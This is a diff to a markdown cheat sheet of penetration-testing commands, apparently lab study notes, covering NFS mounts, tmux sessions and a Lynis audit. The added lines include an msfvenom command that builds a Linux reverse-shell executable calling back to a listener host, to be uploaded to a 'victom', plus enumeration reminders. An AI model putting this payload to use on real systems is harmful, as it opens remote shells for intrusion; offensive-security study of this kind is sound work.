@@ -35,3 +35,12 @@
 | `sudo mount -t nfs 10.129.2.12:/tmp /mnt` | Mount an NFS share locally |
 | `tmux -S /shareds new -s debugsess` | Created a shared `tmux` session socket |
 | `./lynis audit system` | Perform a system audit with `Lynis` |
+
+
+*** TIPS AND TRICK**
+|`msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.2.45 LPORT=4444 -f elf -o shell.elf`| Create own shell if the shell is not working and upload the shell to the victom|
+
+NOTES
+
+check ports
+check /home, /opt/, /var/www/html
